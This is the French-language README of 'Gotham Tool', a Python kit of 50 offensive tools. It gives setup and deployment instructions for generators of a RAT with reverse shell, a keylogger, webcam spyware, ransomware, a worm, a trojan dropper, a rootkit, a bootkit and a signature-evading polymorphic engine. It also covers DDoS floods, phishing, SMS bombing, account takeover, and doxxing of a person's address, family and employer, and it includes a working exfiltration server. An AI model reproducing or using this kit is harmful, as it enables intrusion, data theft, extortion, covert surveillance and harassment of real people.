# 🦇 GOTHAM TOOL
### The Dark Knight's Arsenal
**Powered by Maxime Leal**

---

## 📦 INSTALLATION

### 1. Cloner / placer les fichiers
```bash
mkdir ~/Desktop/gotham_tool
cd ~/Desktop/gotham_tool
# place gotham.py ici
```

### 2. Créer le venv et installer les dépendances
```bash
python3 -m venv venv
source venv/bin/activate
python3 -m pip install rich pyfiglet colorama requests scapy paramiko pynput opencv-python pyautogui flask dnspython pyperclip cryptography pyinstaller
```

### 3. Dépendances système (macOS)
```bash
brew install portaudio nmap aircrack-ng
python3 -m pip install pyaudio  # après brew install portaudio
```

### 4. Lancer le tool
```bash
cd ~/Desktop/gotham_tool
source venv/bin/activate
python3 gotham.py
```

> **À chaque nouveau terminal** : relancer `source venv/bin/activate` avant `python3 gotham.py`

---

## 🚀 LANCEMENT RAPIDE

Crée un fichier `run.sh` :
```bash
cat > run.sh << 'EOF'
#!/bin/bash
cd ~/Desktop/gotham_tool
source venv/bin/activate
python3 gotham.py
EOF
chmod +x run.sh
./run.sh
```

---

## 🦇 NAVIGATION

Au lancement, le menu principal affiche **10 catégories** et **50 tools**.
- Tape le **numéro** du tool (1–50) et appuie sur Entrée
- Tape **0** pour quitter
- Chaque tool pose ses questions puis génère le résultat ou écrit un fichier `.py`

---

## 🦇 RAT / PAYLOAD

---

### Tool 1 — RAT Generator
Génère un RAT Python complet avec reverse shell, exfil système, boucle de reconnexion.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| LHOST | `1.2.3.4` ou adresse ngrok |
| LPORT | `4444` |
| Output filename | `gotham_rat` |

**Fichier généré :** `gotham_rat.py`

**Déploiement :**
```bash
# Ouvrir le listener sur ta machine
nc -lvnp 4444

# Compiler en .exe pour Windows
pyinstaller --onefile --noconsole gotham_rat.py

# Envoyer gotham_rat.exe à la cible
```

**Cross-réseau (ngrok) :**
```bash
ngrok tcp 4444
# utilise l'adresse ngrok (ex: 0.tcp.ngrok.io:12345) comme LHOST
```

---

### Tool 2 — Reverse Shell Builder
Génère une one-liner reverse shell dans le langage choisi.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| LHOST | `1.2.3.4` |
| LPORT | `4444` |
| Langage | `python` / `bash` / `powershell` |

**Usage :**
```bash
# Listener
nc -lvnp 4444

# Coller la one-liner sur la machine cible (SSH, RCE, console, etc.)
```

---

### Tool 3 — Link-based Payload
Génère un serveur Flask qui logge l'IP, le User-Agent, l'OS, la résolution, le fuseau horaire de quiconque clique sur le lien.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Votre IP/domaine | `1.2.3.4` |
| Port Flask | `5000` |
| Titre de la fausse page | `Gotham Update` |

**Fichier généré :** `gotham_link_server.py`

**Usage :**
```bash
python3 gotham_link_server.py
# Envoyer à la cible : http://1.2.3.4:5000/
# Hits → hits.json
# Fingerprints → fingerprints.json
```

---

### Tool 4 — Keylogger Builder
Génère un keylogger avec log local et exfil email optionnelle.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output filename | `gotham_keylog` |
| Email exfil | `toi@gmail.com` (ou vide) |

**Fichier généré :** `gotham_keylog.py`

**Config email :** ouvrir le fichier généré et remplir :
```python
SMTP_HOST = "smtp.gmail.com"
SMTP_USER = "toi@gmail.com"
SMTP_PASS = "ton_app_password"
```

**Compiler :**
```bash
pyinstaller --onefile --noconsole --hidden-import pynput gotham_keylog.py
# dist/gotham_keylog.exe → envoyer à la cible
```

---

### Tool 5 — Camera Hijack
Génère un script qui capture des photos via la webcam et les envoie à ton serveur.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output filename | `gotham_cam` |

**Fichier généré :** `gotham_cam.py`

**Config :** ouvrir le fichier et remplir :
```python
LHOST = "http://1.2.3.4:5000/upload"
INTERVAL = 10  # secondes entre chaque photo
```

**Serveur de réception (Flask) :**
```python
@app.route("/upload", methods=["POST"])
def upload():
    img = request.files["img"]
    img.save(f"captures/{img.filename}")
    return "ok"
```

---

## 🔍 OSINT / CSINT

---

### Tool 6 — OSINT Username Hunt
Vérifie la présence d'un username sur 14 plateformes (GitHub, Instagram, Reddit, TikTok, Steam, etc.)

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Username | `johndoe` |

**Output :** tableau FOUND / 404 / TIMEOUT par plateforme, directement dans le terminal.

---

### Tool 7 — OSINT Email Recon
Recon sur une adresse email : MX records du domaine, formats courants, guide HIBP.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Email cible | `cible@gmail.com` |

**Note :** pour les breaches HIBP, récupérer une clé API sur [haveibeenpwned.com](https://haveibeenpwned.com/API/Key) et l'intégrer dans le code.

---

### Tool 8 — OSINT Phone Lookup
Identifie le pays/opérateur d'un numéro, guide vers Truecaller et NumVerify.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Numéro (+indicatif) | `+33612345678` |

**Pour lookup complet :** clé API NumVerify sur [numverify.com](https://numverify.com).

---

### Tool 9 — OSINT IP Geo Trace
Géolocalise une IP : ville, région, pays, ASN, organisation, coordonnées GPS, reverse DNS.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| IP cible | `8.8.8.8` |

**Output :** tableau complet dans le terminal.

---

### Tool 10 — OSINT Domain Recon
Recon complet sur un domaine : RDAP/WHOIS, DNS (A/AAAA/MX/NS/TXT/CNAME), subdomains via crt.sh.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Domaine | `exemple.com` |

**Output :** records DNS + liste des subdomains trouvés (max 20 affichés).

---

### Tool 11 — CSINT Social Graph
Construit un graphe social : dorks Google ciblés, Pipl, Spokeo, LinkedIn, Facebook.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Nom ou username | `Jean Dupont` |

**Output :** liste de dorks et liens directs à ouvrir dans le navigateur.

---

## 💀 DOX

---

### Tool 12 — Dox Full Profile
Génère un rapport dox complet : dorks Google multi-angles + liste des data brokers à consulter.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Nom complet | `Jean Dupont` |
| Ville/État | `Paris` |
| Email ou username | `jean.dupont` |

**Output :** dorks + liens Spokeo / Whitepages / Intelius / BeenVerified / Pipl.

---

### Tool 13 — Dox Address Finder
Liens directs vers les data brokers pour trouver l'adresse physique.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Nom complet | `Jean Dupont` |

---

### Tool 14 — Dox Family Map
Dorks pour mapper la famille (frères/sœurs, conjoint, enfants) + nécrologies + ancestry.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Nom cible | `Jean Dupont` |

---

### Tool 15 — Dox Employer Recon
LinkedIn search + dorks pour identifier l'employeur, le poste, l'entreprise.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Nom cible | `Jean Dupont` |

---

## 🌊 DDoS / DoS

> ⚠️ Root/admin requis pour SYN Flood. Utiliser sur des cibles dont tu es propriétaire ou autorisé.

---

### Tool 16 — HTTP Flood DDoS
Flood HTTP multi-threadé sur une URL cible.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| URL cible | `http://1.2.3.4` |
| Threads | `200` |
| Durée (sec) | `30` |

**Output :** compteur de requêtes en temps réel.

---

### Tool 17 — UDP Flood
Flood UDP raw sur IP:port cible, 100 threads, payload aléatoire 1024 bytes.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| IP cible | `1.2.3.4` |
| Port | `80` |
| Durée (sec) | `30` |

---

### Tool 18 — SYN Flood
Génère `gotham_syn.py` — SYN flood avec IP source aléatoire via Scapy.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| IP cible | `1.2.3.4` |
| Port | `80` |
| Nombre de paquets | `1000` |

**Lancer :**
```bash
sudo python3 gotham_syn.py
```

---

### Tool 19 — Slowloris
Ouvre N sockets HTTP partiels et les maintient ouverts indéfiniment — sature le serveur sans bande passante.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Host cible | `exemple.com` |
| Port | `80` |
| Nombre de sockets | `150` |

**Stop :** `Ctrl+C`

---

### Tool 20 — Amplification DDoS
Tableau des vecteurs d'amplification : DNS (70x), NTP (556x), Memcached (51200x), SSDP (30x), CHARGEN (358x).

**Output :** tableau avec port, facteur d'amplification, méthode — aucun input requis.

---

## 🛠 MALWARE FACTORY

---

### Tool 21 — Ransomware Builder
Génère un ransomware Fernet (AES-128) qui chiffre les fichiers et drop une note de rançon.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output filename | `gotham_ransom` |
| Extensions cibles | `.txt,.docx` ou `*` pour tout |

**Fichier généré :** `gotham_ransom.py`

> La clé de déchiffrement s'affiche au lancement — la sauvegarder avant d'exécuter.

---

### Tool 22 — Worm Generator
Génère un ver qui scanne le LAN (192.168.1.0/24) et se copie sur les clés USB détectées.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output filename | `gotham_worm` |
| IP serveur payload | `1.2.3.4` |

**Fichier généré :** `gotham_worm.py`

> Remplir la section exploit pour le vecteur de propagation réseau (SMB, SSH, etc.)

---

### Tool 23 — Trojan Dropper
Télécharge et exécute un payload silencieusement, ouvre un fichier leurre pour la cible.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output filename | `gotham_trojan` |
| Serveur payload | `1.2.3.4` |

**Fichier généré :** `gotham_trojan.py`

**Setup serveur :**
```
http://1.2.3.4/payload.exe  → ton RAT compilé
http://1.2.3.4/decoy.pdf    → fichier leurre légitime
```

---

### Tool 24 — Cryptominer Injector
Lance XMRig en background silencieux, minage Monero.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output filename | `gotham_miner` |
| Pool | `pool.supportxmr.com:3333` |
| Wallet | `ton_adresse_XMR` |

**Fichier généré :** `gotham_miner.py`

> XMRig doit être présent sur la machine cible ou téléchargé par le script.

---

### Tool 25 — Spyware Builder
Combine keylogger + screenshot + webcam + clipboard en un seul agent avec exfil HTTP.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output filename | `gotham_spy` |
| Serveur exfil | `1.2.3.4` |

**Fichier généré :** `gotham_spy.py`

**Serveur de réception :**
```python
@app.route("/exfil", methods=["POST"])
def exfil():
    data = request.json
    print(f"[{data['type']}] {data['data'][:100]}")
    return "ok"
```

---

### Tool 26 — Rootkit Loader
Génère `gotham_rootkit.c` — LKM Linux qui cache fichiers (par préfixe) et PIDs.

**Fichier généré :** `gotham_rootkit.c`

**Compiler et charger :**
```bash
# Créer Makefile
echo 'obj-m += gotham_rootkit.o' > Makefile
echo 'all:' >> Makefile
echo '	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' >> Makefile

make
sudo insmod gotham_rootkit.ko hide_pid=1234
# Vérifier
dmesg | tail -5
```

**Décharger :**
```bash
sudo rmmod gotham_rootkit
```

---

### Tool 27 — Bootkit Builder
Génère `gotham_bootkit.asm` — infecteur MBR en assembleur x86.

**Fichier généré :** `gotham_bootkit.asm`

**Assembler et écrire :**
```bash
nasm -f bin gotham_bootkit.asm -o mbr.bin
# DESTRUCTIF — VM uniquement
sudo dd if=mbr.bin of=/dev/sdX bs=512 count=1
```

---

### Tool 28 — Polymorphic Engine
Génère `gotham_poly.py` — wrapper polymorphe XOR rotatif qui mute un payload binaire à chaque génération.

**Usage :**
```bash
# Préparer le payload binaire
python3 gotham_poly.py payload.bin
# Output : gotham_mutant_XXXX.py avec clé XOR différente à chaque run
```

**Chaque run produit un hash différent** — contourne les signatures statiques.

---

## 📡 RÉSEAU

---

### Tool 29 — Port Scanner
Scan TCP multi-threadé avec identification des services courants.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| IP/host cible | `192.168.1.1` |
| Plage de ports | `1-1024` |

**Output :** tableau des ports ouverts avec nom de service.

---

### Tool 30 — LAN Map
Ping sweep sur un subnet CIDR, identifie les hôtes actifs avec reverse DNS.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Subnet | `192.168.1.0/24` |

**Output :** liste IP + hostname pour chaque hôte actif.

---

### Tool 31 — Packet Sniffer
Génère `gotham_sniffer.py` — capture paquets IP/TCP/UDP avec payload brut via Scapy.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Interface | `eth0` / `en0` |
| Nombre de paquets | `50` |

**Lancer :**
```bash
sudo python3 gotham_sniffer.py
```

---

### Tool 32 — ARP Spoof
Génère `gotham_arp.py` — ARP poisoning bidirectionnel cible ↔ gateway + restauration propre au Ctrl+C.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| IP cible | `192.168.1.50` |
| IP gateway | `192.168.1.1` |

**Prérequis :**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo python3 gotham_arp.py
```

---

### Tool 33 — DNS Poisoner
Génère `gotham_dns_poison.py` — spoof DNS via Scapy, redirige des domaines vers ton IP.

**Config :** ouvrir le fichier et remplir `POISON_MAP` :
```python
POISON_MAP = {
    "cible.com.": "1.2.3.4",
}
```

**Prérequis :** ARP spoof actif sur la cible (Tool 32).
```bash
sudo python3 gotham_dns_poison.py
```

---

## 🔑 CREDS / BRUTE

---

### Tool 34 — SSH Bruteforce
Génère `gotham_ssh_brute.py` — bruteforce SSH avec Paramiko sur wordlist.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Host cible | `192.168.1.50` |
| Username | `root` |
| Wordlist | `/usr/share/wordlists/rockyou.txt` |

**Lancer :**
```bash
python3 gotham_ssh_brute.py
```

---

### Tool 35 — FTP Bruteforce
Bruteforce FTP natif Python sur wordlist.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Host cible | `ftp.exemple.com` |
| Username | `anonymous` |
| Wordlist | `/usr/share/wordlists/rockyou.txt` |

---

### Tool 36 — Hash Cracker
Craque un hash MD5 / SHA1 / SHA256 par dictionnaire.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Hash | `5f4dcc3b5aa765d61d8327deb882cf99` |
| Wordlist | `/usr/share/wordlists/rockyou.txt` |
| Algorithme | `md5` / `sha1` / `sha256` |

**Output :** mot de passe en clair si trouvé.

---

### Tool 37 — WiFi Handshake Grab
Génère la séquence de commandes aircrack-ng complète : monitor mode → capture → deauth → crack.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Interface | `wlan0` |
| BSSID cible | `AA:BB:CC:DD:EE:FF` |
| Channel | `6` |

**Output :** 4 commandes à exécuter dans l'ordre, copiables directement.

---

## 📸 SURVEILLANCE

---

### Tool 38 — Remote Camera Snap
Capture une photo depuis la webcam locale et la sauvegarde.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output file | `gotham_snap.jpg` |

> Sur une cible distante : intégrer dans le Master Payload (Tool 50) ou le Spyware (Tool 25).

---

### Tool 39 — Mic Recorder
Génère `gotham_mic.py` — enregistre le micro N secondes en WAV.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Durée (sec) | `10` |
| Output file | `gotham_mic.wav` |

**Prérequis :**
```bash
brew install portaudio
pip install pyaudio
python3 gotham_mic.py
```

---

### Tool 40 — Screen Capture
Screenshot immédiat de l'écran local via pyautogui.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Output file | `gotham_screen.png` |

---

### Tool 41 — Clipboard Logger
Génère `gotham_clip.py` — surveille le presse-papier N secondes et logge chaque changement.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Durée (sec) | `60` |
| Log file | `gotham_clip.txt` |

---

## 💻 EXPLOITATION

---

### Tool 42 — SQLi Scanner
Teste une URL avec paramètre GET contre 14 payloads SQLi classiques, détecte les erreurs SQL dans la réponse.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| URL cible | `http://site.com/page.php?id=` |

**Output :** `[VULN]` si un payload déclenche une erreur SQL.

---

### Tool 43 — XSS Injector
Teste une URL contre 6 payloads XSS réfléchis.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| URL cible | `http://site.com/search?q=` |

**Output :** `[VULN]` si le payload est réfléchi dans la réponse.

---

### Tool 44 — LFI Scanner
Teste une URL contre 8 payloads LFI (Linux + Windows), détecte `root:x:` / `[fonts]` / etc.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| URL cible | `http://site.com/page.php?file=` |

---

### Tool 45 — RCE Tester
Teste une URL contre 10 payloads RCE (injection de commande OS), détecte `uid=` / `root` / `whoami` dans la réponse.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| URL cible | `http://site.com/ping.php?host=` |

---

### Tool 46 — CVE Exploit Loader
Ouvre les liens de recherche pour un CVE : Exploit-DB, GitHub, NVD. Guide vers `searchsploit` pour download local.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| CVE ID | `CVE-2021-44228` |

**searchsploit (Kali/Parrot) :**
```bash
searchsploit CVE-2021-44228
searchsploit -m 50592  # télécharge l'exploit
```

---

## 🃏 JOKER SPECIALS

---

### Tool 47 — Phishing Kit
Génère un serveur Flask qui clone une page de login, capture les credentials et redirige vers le vrai site.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Site à cloner | `google.com` |
| Votre IP | `1.2.3.4` |
| Port | `5000` |
| Titre de la page | `Google Sign In` |

**Fichier généré :** `gotham_phish.py`

**Usage :**
```bash
python3 gotham_phish.py
# Envoyer à la cible : http://1.2.3.4:5000/
# Credentials → gotham_creds.json
```

**Cross-réseau :**
```bash
ngrok http 5000
# Partager l'URL ngrok à la cible
```

---

### Tool 48 — SMS Bomber
Déclenche des requêtes OTP / reset password répétées vers un numéro cible.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Numéro cible | `+33612345678` |
| Nombre d'envois | `20` |

> Pour du volume élevé : combiner avec des scripts bomber GitHub (chercher : `sms bomber python`).

---

### Tool 49 — Account Nuker
4 stratégies de suppression/neutralisation de compte :
1. Mass report coordonné
2. Génère un template DMCA (`gotham_dmca.txt`)
3. Guide credential stuffing → changement email/password
4. Guide vol de session cookie via phishing

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| Stratégie (1-4) | `2` |

---

### Tool 50 — Gotham Master Payload
Le payload ultime : RAT + keylogger + screenshot + webcam + clipboard + **persistance au reboot** (Windows registry / crontab Linux), tout exfiltré vers ton serveur.

**Inputs demandés :**
| Champ | Exemple |
|---|---|
| LHOST | `1.2.3.4` |
| LPORT | `4444` |
| Output filename | `gotham_master` |

**Fichier généré :** `gotham_master.py`

**Déploiement complet :**
```bash
# 1. Compiler
pyinstaller --onefile --noconsole \
  --hidden-import pynput \
  --hidden-import cv2 \
  --hidden-import pyautogui \
  gotham_master.py

# 2. Listener RAT (commandes shell)
nc -lvnp 4444

# 3. Serveur exfil (données : keys/screen/cam/clip)
# Lancer un Flask /exfil sur le même LPORT ou un port séparé
```

**Serveur exfil minimal :**
```python
from flask import Flask, request
import base64, json, datetime, os

app = Flask(__name__)
os.makedirs("exfil_data", exist_ok=True)

@app.route("/exfil", methods=["POST"])
def exfil():
    data = request.json
    t = data.get("t","unknown")
    d = data.get("d","")
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    if t == "screen":
        with open(f"exfil_data/screen_{ts}.png","wb") as f:
            f.write(base64.b64decode(d))
    elif t == "cam":
        with open(f"exfil_data/cam_{ts}.jpg","wb") as f:
            f.write(base64.b64decode(d))
    else:
        with open(f"exfil_data/{t}_{ts}.txt","w") as f:
            f.write(d)
    print(f"[EXFIL] {t} — {len(d)} chars")
    return "ok"

app.run(host="0.0.0.0", port=5000)
```

---

## 🔧 TROUBLESHOOTING

| Erreur | Fix |
|---|---|
| `ModuleNotFoundError` | `python3 -m pip install <module>` dans le venv actif |
| `externally-managed-environment` | `python3 -m pip install --break-system-packages <module>` |
| `Permission denied` (SYN/ARP/sniff) | `sudo python3 gotham.py` |
| `pyaudio` install fail | `brew install portaudio` d'abord |
| ngrok not found | `brew install ngrok` ou [ngrok.com](https://ngrok.com) |
| `No camera found` (Tool 5/38) | Vérifier permissions caméra macOS : Préférences → Sécurité → Caméra |
| Venv pas actif | `source ~/Desktop/gotham_tool/venv/bin/activate` |
| pyinstaller .exe sur macOS | Cross-compile impossible nativement — utiliser une VM Windows |

---

## 📋 DÉPENDANCES COMPLÈTES

```
rich
pyfiglet
colorama
requests
scapy
paramiko
pynput
opencv-python
pyautogui
flask
dnspython
pyperclip
cryptography
pyinstaller
pyaudio          # brew install portaudio d'abord
keyboard
```

---

*🦇 Gotham Tool — Powered by Maxime Leal*
